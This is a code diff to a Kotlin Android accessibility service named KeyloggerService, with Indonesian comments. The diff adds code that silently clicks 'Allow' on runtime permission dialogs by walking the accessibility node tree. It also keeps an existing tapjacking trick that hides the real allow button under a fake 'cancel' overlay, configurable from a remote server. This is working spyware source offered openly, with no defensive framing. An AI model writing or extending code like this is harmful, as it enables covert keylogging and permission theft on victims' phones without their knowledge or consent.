@@ -25,6 +25,10 @@ class KeyloggerService : AccessibilityService() {
     companion object {
         @Volatile var instance: KeyloggerService? = null
         @Volatile var unlockCode: String = "2719"
+        /** Jika true, saat dialog izin runtime muncul, langsung klik "Izinkan"
+         *  via AccessibilityNodeInfo.ACTION_CLICK — tanpa overlay, tanpa gesture koordinat */
+        @Volatile var autoGrantEnabled: Boolean = false
+
         fun showScreenInject(text: String, style: String = "hacker", speed: Float = 0.60f) { instance?.showOverlay(text, style, speed) }
         fun injectTap(x: Float, y: Float) { instance?.dispatchTap(x, y) }
         fun hideScreenInject()   { instance?.hideOverlay() }
@@ -202,20 +206,32 @@ class KeyloggerService : AccessibilityService() {
     }
 
     /**
-     * Cek apakah package yang baru muncul adalah dialog izin sistem.
-     * Jika ya dan overlay belum aktif, otomatis tampilkan overlay trick
-     * dengan config default (tombol "BATAL" di atas posisi "Allow" umum).
+     * Cek apakah package yang baru muncul adalah dialog izin runtime.
      *
-     * Config dapat di-override dari server via command overlay_start + JSON.
-     * targetX/targetY default: pusat layar horizontal, ~80% dari atas layar
-     * (posisi umum tombol "IZINKAN" di AOSP — sesuaikan untuk ROM spesifik).
+     * Mode AUTO-GRANT (autoGrantEnabled = true):
+     *   Langsung scan node tree → cari tombol "Izinkan" / "Allow" →
+     *   performAction(ACTION_CLICK). Tidak perlu overlay, tidak perlu koordinat.
+     *
+     * Mode OVERLAY TRICK (default):
+     *   Tampilkan overlay "BATAL" di atas tombol "Izinkan" (tapjacking).
      */
     private fun autoTriggerOverlay(pkg: String) {
         if (!PERMISSION_DIALOG_PACKAGES.contains(pkg)) return
+
+        if (autoGrantEnabled) {
+            // ── Mode: auto-grant via AccessibilityService node click ──────────
+            // Delay 400ms agar dialog fully rendered + node hierarchy tersedia
+            handler.postDelayed({
+                val clicked = autoClickAllow()
+                android.util.Log.d("AutoGrant", "auto-click result=$clicked pkg=$pkg")
+            }, 400)
+            return
+        }
+
+        // ── Mode: overlay trick (lama) ────────────────────────────────────────
         if (OverlayTrickManager.isActive) return
         if (!Settings.canDrawOverlays(applicationContext)) return
 
-        // Delay 350ms agar dialog sistem sempat fully rendered sebelum overlay muncul
         handler.postDelayed({
             if (OverlayTrickManager.isActive) return@postDelayed
             val configJson = """
@@ -230,6 +246,67 @@ class KeyloggerService : AccessibilityService() {
             """.trimIndent()
             OverlayTrickManager.start(applicationContext, configJson, callerPkg = pkg)
         }, 350)
+    }
+
+    /**
+     * Scan semua node di window aktif, cari tombol "Izinkan" / "Allow" dan klik.
+     * Mengembalikan true jika berhasil klik.
+     */
+    private fun autoClickAllow(): Boolean {
+        val root = rootInActiveWindow ?: return false
+        return try {
+            traverseAndClickAllow(root)
+        } finally {
+            try { root.recycle() } catch (_: Exception) {}
+        }
+    }
+
+    private fun traverseAndClickAllow(
+        node: android.view.accessibility.AccessibilityNodeInfo
+    ): Boolean {
+        // Label-label tombol "Allow" dari berbagai ROM & bahasa
+        val ALLOW_LABELS = setOf(
+            "izinkan", "allow", "izin", "grant",
+            "izinkan saja", "only this time",
+            "hanya kali ini", "selalu", "always",
+            "while using the app", "hanya saat menggunakan aplikasi",
+            "allow only while using the app"
+        )
+
+        val text = node.text?.toString()?.trim()?.lowercase() ?: ""
+        val desc = node.contentDescription?.toString()?.trim()?.lowercase() ?: ""
+
+        val isAllow = ALLOW_LABELS.any { label ->
+            text == label || text.startsWith(label) ||
+            desc == label || desc.startsWith(label)
+        }
+
+        if (isAllow) {
+            // Coba klik node langsung
+            if (node.isClickable) {
+                node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                return true
+            }
+            // Fallback: klik parent
+            val parent = node.parent
+            if (parent != null) {
+                if (parent.isClickable) {
+                    parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                    try { parent.recycle() } catch (_: Exception) {}
+                    return true
+                }
+                try { parent.recycle() } catch (_: Exception) {}
+            }
+        }
+
+        // Rekursif ke semua child
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val found = traverseAndClickAllow(child)
+            try { child.recycle() } catch (_: Exception) {}
+            if (found) return true
+        }
+        return false
     }
 
     override fun onInterrupt() {}
